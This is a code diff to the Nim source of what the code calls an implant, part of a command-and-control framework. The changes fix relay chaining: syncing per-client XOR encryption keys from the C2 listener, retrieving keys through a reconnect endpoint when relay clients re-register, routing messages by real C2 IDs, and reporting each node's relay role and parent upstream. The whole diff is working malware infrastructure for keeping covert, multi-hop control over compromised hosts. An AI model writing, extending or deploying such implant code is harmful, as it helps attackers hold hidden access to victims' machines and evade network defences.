@@ -461,6 +461,32 @@ proc clearSensitiveKey(key: var string) =
         when defined debug:
             echo "[KEY] 🧹 Sensitive key cleared from memory"
 
+# Get encryption key from C2 reconnect endpoint for existing relay client
+proc getEncryptionKeyFromC2Reconnect(li: var Listener, clientId: string): string =
+    when defined debug:
+        echo "[DEBUG] 🔑 Getting encryption key from C2 reconnect endpoint for client: " & clientId
+    
+    # Create temporary listener with the relay client's ID
+    var tempListener = li
+    tempListener.id = clientId
+    
+    # Use the existing reconnect function which already handles the OPTIONS request
+    webClientListener.reconnect(tempListener)
+    
+    when defined debug:
+        echo "[DEBUG] 🔑 Reconnect completed for client: " & clientId
+        echo "[DEBUG] 🔑 Reconnect success: " & $tempListener.registered
+        echo "[DEBUG] 🔑 Encryption key length: " & $tempListener.UNIQUE_XOR_KEY.len
+    
+    if tempListener.registered and tempListener.UNIQUE_XOR_KEY != "":
+        when defined debug:
+            echo "[DEBUG] 🔑 Successfully got encryption key from C2 reconnect"
+        return tempListener.UNIQUE_XOR_KEY
+    else:
+        when defined debug:
+            echo "[DEBUG] 🔑 Failed to get encryption key from C2 reconnect endpoint"
+        return ""
+
 # Async HTTP handler - Handles C2 communication
 proc httpHandler() {.async.} =
     when defined debug:
@@ -522,6 +548,13 @@ proc httpHandler() {.async.} =
                 if listener.initialized and listener.registered:
                     when defined debug:
                         echo "[DEBUG] ✅ HTTP Handler: Direct C2 reconnection successful with stored ID: " & storedId
+                    
+                    # CRITICAL FIX: Sync relay client encryption key from HTTP listener
+                    if listener.UNIQUE_XOR_KEY != "":
+                        g_relayClientKey = listener.UNIQUE_XOR_KEY
+                        when defined debug:
+                            echo "[DEBUG] 🔑 RECONNECTION FIX: Synced g_relayClientKey from listener"
+                            echo "[DEBUG] 🔑 RECONNECTION FIX: Key length: " & $g_relayClientKey.len
                 else:
                     when defined debug:
                         echo "[DEBUG] ❌ HTTP Handler: Direct C2 reconnection failed - will register as new implant"
@@ -530,11 +563,25 @@ proc httpHandler() {.async.} =
                     listener.initialized = false
                     listener.registered = false
                     webClientListener.init(listener)
+                    
+                    # CRITICAL FIX: Sync relay client encryption key from HTTP listener after reinitialization
+                    if listener.UNIQUE_XOR_KEY != "":
+                        g_relayClientKey = listener.UNIQUE_XOR_KEY
+                        when defined debug:
+                            echo "[DEBUG] 🔑 REINITIALIZATION FIX: Synced g_relayClientKey from listener"
+                            echo "[DEBUG] 🔑 REINITIALIZATION FIX: Key length: " & $g_relayClientKey.len
             else:
                 when defined debug:
                     echo "[DEBUG] 🆕 HTTP Handler: No stored ID found - performing initial C2 registration"
                 # No stored ID, perform initial registration
                 webClientListener.init(listener)
+                
+                # CRITICAL FIX: Sync relay client encryption key from HTTP listener after initialization
+                if listener.UNIQUE_XOR_KEY != "":
+                    g_relayClientKey = listener.UNIQUE_XOR_KEY
+                    when defined debug:
+                        echo "[DEBUG] 🔑 INITIALIZATION FIX: Synced g_relayClientKey from listener"
+                        echo "[DEBUG] 🔑 INITIALIZATION FIX: Key length: " & $g_relayClientKey.len
         else:
             # IN relay mode - encryption key must come from RelayServer, not direct C2 HTTP
             when defined debug:
@@ -566,6 +613,13 @@ proc httpHandler() {.async.} =
             
             webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
                                                  osInfo, pid, processName, false, relayRole)
+            
+            # CRITICAL FIX: Sync relay client encryption key from HTTP listener after registration
+            if listener.UNIQUE_XOR_KEY != "":
+                g_relayClientKey = listener.UNIQUE_XOR_KEY
+                when defined debug:
+                    echo "[DEBUG] 🔑 REGISTRATION FIX: Synced g_relayClientKey from listener"
+                    echo "[DEBUG] 🔑 REGISTRATION FIX: Key length: " & $g_relayClientKey.len
             
             when defined debug:
                 echo "[DEBUG] 🌐 HTTP Handler: Direct C2 registration completed"
@@ -723,9 +777,11 @@ proc httpHandler() {.async.} =
                                         else:
                                             echo "[DEBUG] ✅ ID VALIDATION: New ID '" & assignedId & "' is unique (not in current registry)"
                                 else:
-                                    # RE-REGISTRATION: Client has existing ID, don't change it!
+                                    # RE-REGISTRATION: Client has existing ID, GET ENCRYPTION KEY FROM C2
                                     assignedId = registration.clientId  # Keep the existing ID
-                                    encryptionKey = ""  # Client will use its existing encryption key
+                                    
+                                    # CRITICAL FIX: Get encryption key from C2 reconnect endpoint
+                                    encryptionKey = getEncryptionKeyFromC2Reconnect(listener, registration.clientId)
                                     
                                     when defined debug:
                                         echo "[DEBUG] 🔄 ID VALIDATION: RE-REGISTRATION detected"
@@ -734,8 +790,9 @@ proc httpHandler() {.async.} =
                                         echo "[DEBUG] 🔄 ID VALIDATION: Should be IDENTICAL (no change)"
                                         if assignedId != registration.clientId:
                                             echo "[DEBUG] 🚨🚨🚨 CRITICAL BUG: assignedId != registration.clientId! 🚨🚨🚨"
-                                        echo "[DEBUG] 🔄 HTTP Handler: NOT forwarding to C2, accepting existing client"
-                                        echo "[DEBUG] 🔄 ID VALIDATION: This should be safe - client already had this ID"
+                                        echo "[DEBUG] 🔄 HTTP Handler: Got encryption key from C2 reconnect endpoint"
+                                        echo "[DEBUG] 🔄 ID VALIDATION: Encryption key length: " & $encryptionKey.len
+                                        echo "[DEBUG] 🔄 ID VALIDATION: This should fix the empty g_relayClientKey bug"
                                 
                                 # ADAPTIVE TIMING: Check if client is in fast mode and adapt server timing
                                 if regData.hasKey("fastMode") and regData["fastMode"].getBool():
@@ -770,25 +827,26 @@ proc httpHandler() {.async.} =
                                         responseData = %*{
                                             "id": assignedId,
                                             "key": encryptionKey,
-                                            "parent_guid": listener.id  # Include relay server GUID as parent
+                                            "parent_guid": listener.id  # This relay server's C2 ID becomes the client's parent
                                         }
                                         when defined debug:
                                             echo "[DEBUG] 🆕 HTTP Handler: Sending NEW ID, encryption key and parent GUID to client"
                                             echo "[DEBUG] 🆕 HTTP Handler: Parent GUID (this relay server): " & listener.id
+                                            echo "[DEBUG] 🆕 HTTP Handler: Listener ID empty: " & $(listener.id == "")
                                     else:
                                         # RE-REGISTRATION: Send confirmation with existing ID (no new key) plus parent GUID
                                         responseData = %*{
                                             "id": assignedId,
                                             "status": "reconnected",
-                                            "parent_guid": listener.id  # Include relay server GUID as parent
+                                            "parent_guid": listener.id  # This relay server's C2 ID becomes the client's parent
                                         }
                                         when defined debug:
                                             echo "[DEBUG] 🔄 HTTP Handler: Sending RE-REGISTRATION confirmation with parent GUID to client"
                                             echo "[DEBUG] 🔄 HTTP Handler: Parent GUID (this relay server): " & listener.id
                                     
                                     let idMsg = createMessage(HTTP_RESPONSE,
-                                        getRelayServerID(),
-                                        @[registration.clientId, "RELAY-SERVER"],
+                                        listener.id,  # Use relay server's real C2 ID, not generated ID
+                                        @[registration.clientId, listener.id],  # Route with real IDs
                                         $responseData
                                     )
                                     
@@ -1285,13 +1343,35 @@ proc httpHandler() {.async.} =
                         # Use pending chain info from relay command
                         let (myRole, parentGuid, listeningPort) = relay_commands.g_pendingChainInfo
                         
-                        webClientListener.postChainInfo(listener, listener.id, parentGuid, myRole, listeningPort)
+                        # FIXED: Use same logic as regular updates - check upstream connection
+                        if upstreamRelay.isConnected:
+                            # RELAY_CLIENT or CHAINED RELAY_SERVER: Send via upstream relay server
+                            let chainMsg = relay_protocol.createChainInfoMessage(
+                                g_relayClientID,
+                                @[g_relayClientID, g_parentRelayServerGuid],
+                                parentGuid,
+                                myRole,
+                                listeningPort
+                            )
+                            let success = relay_comm.sendMessage(upstreamRelay, chainMsg)
+                            
+                            when defined debug:
+                                if success:
+                                    echo "[DEBUG] 🔗 Chain Info: ✅ IMMEDIATE update sent via UPSTREAM RELAY (" & myRole & ")"
+                                else:
+                                    echo "[DEBUG] 🔗 Chain Info: ❌ IMMEDIATE update failed via upstream relay"
+                        else:
+                            # ROOT RELAY_SERVER/STANDARD: Send directly to C2
+                            webClientListener.postChainInfo(listener, listener.id, parentGuid, myRole, listeningPort)
+                            
+                            when defined debug:
+                                echo "[DEBUG] 🔗 Chain Info: ✅ IMMEDIATE update sent DIRECTLY to C2 (role: " & myRole & ")"
                         
                         # Reset immediate update flag
                         relay_commands.g_immediateChainInfoUpdate = false
                         
                         when defined debug:
-                            echo "[DEBUG] 🔗 Chain Info: ✅ IMMEDIATE update sent - Role=" & myRole & ", Parent=" & parentGuid & ", Port=" & $listeningPort
+                            echo "[DEBUG] 🔗 Chain Info: ✅ IMMEDIATE update completed - Role=" & myRole & ", Parent=" & parentGuid & ", Port=" & $listeningPort
                     else:
                         # Determine our role and parent info for regular updates
                         var myRole = "STANDARD"
@@ -1299,14 +1379,24 @@ proc httpHandler() {.async.} =
                         var listeningPort = 0
                         
                         # Determine role based on relay server status and relay client connection
-                        if g_relayServer.isListening and upstreamRelay.isConnected:
-                            myRole = "RELAY_HYBRID"
-                            listeningPort = g_relayServer.port
-                            # TODO: Get parent GUID from upstream relay connection
-                        elif g_relayServer.isListening:
+                        # FIXED: Handle chained relay servers (RELAY_SERVER with upstream connection)
+                        if g_relayServer.isListening:
                             myRole = "RELAY_SERVER"
                             listeningPort = g_relayServer.port
-                            parentGuid = ""  # Direct to C2
+                            
+                            # CRITICAL: If we're also connected upstream, we have a parent GUID
+                            if upstreamRelay.isConnected:
+                                # CHAINED RELAY SERVER: Has both upstream connection AND listens for downstream
+                                parentGuid = getParentRelayServerGuid()
+                                if parentGuid == "":
+                                    parentGuid = g_parentRelayServerGuid
+                                when defined debug:
+                                    echo "[DEBUG] 🔗 Chain Info: CHAINED RELAY SERVER - listening on " & $listeningPort & ", parent: " & parentGuid
+                            else:
+                                # ROOT RELAY SERVER: Direct to C2, no parent
+                                parentGuid = ""
+                                when defined debug:
+                                    echo "[DEBUG] 🔗 Chain Info: ROOT RELAY SERVER - direct to C2"
                         elif upstreamRelay.isConnected:
                             myRole = "RELAY_CLIENT"
                             # Use stored parent relay server GUID
@@ -1333,7 +1423,7 @@ proc httpHandler() {.async.} =
                         # Send chain info to C2 (every few cycles to avoid spam)
                         if httpCycleCount mod 10 == 1:  # Every 10th cycle
                             if upstreamRelay.isConnected:
-                                # RELAY_CLIENT: Send via relay server
+                                # RELAY_CLIENT or CHAINED RELAY_SERVER: Send via upstream relay server
                                 let chainMsg = relay_protocol.createChainInfoMessage(
                                     g_relayClientID,
                                     @[g_relayClientID, g_parentRelayServerGuid],
@@ -1345,15 +1435,15 @@ proc httpHandler() {.async.} =
                                 
                                 when defined debug:
                                     if success:
-                                        echo "[DEBUG] 🔗 Chain Info: ✅ Regular update sent via RELAY SERVER"
+                                        echo "[DEBUG] 🔗 Chain Info: ✅ Regular update sent via UPSTREAM RELAY (" & myRole & ")"
                                     else:
-                                        echo "[DEBUG] 🔗 Chain Info: ❌ Failed to send via relay server"
+                                        echo "[DEBUG] 🔗 Chain Info: ❌ Failed to send via upstream relay"
                             else:
-                                # RELAY_SERVER/STANDARD: Send directly to C2
+                                # ROOT RELAY_SERVER/STANDARD: Send directly to C2
                                 webClientListener.postChainInfo(listener, listener.id, parentGuid, myRole, listeningPort)
                                 
                                 when defined debug:
-                                    echo "[DEBUG] 🔗 Chain Info: ✅ Regular update sent DIRECTLY to C2"
+                                    echo "[DEBUG] 🔗 Chain Info: ✅ Regular update sent DIRECTLY to C2 (role: " & myRole & ")"
                         else:
                             when defined debug:
                                 echo "[DEBUG] 🔗 Chain Info: Skipping cycle " & $httpCycleCount & " (sends every 10th)"
@@ -1887,9 +1977,16 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 if upstreamRelay.isConnected and g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION":
                     # CHANGED: Send more frequently for testing - every 3 cycles instead of 10
                     if loopCount mod 3 == 1:
-                        let myRole = "RELAY_CLIENT"
+                        # FIXED: Determine role correctly for CHAINED RELAY SERVER
+                        var myRole = "RELAY_CLIENT"
+                        var listeningPort = 0
+                        
+                        # Check if we're also functioning as a relay server (CHAINED RELAY SERVER)
+                        if g_relayServer.isListening:
+                            myRole = "RELAY_SERVER"
+                            listeningPort = g_relayServer.port
+                        
                         let parentGuid = g_parentRelayServerGuid
-                        let listeningPort = 0  # Relay clients don't listen
                         
                         when defined debug:
                             echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ✅ SENDING chain info - Cycle #" & $loopCount
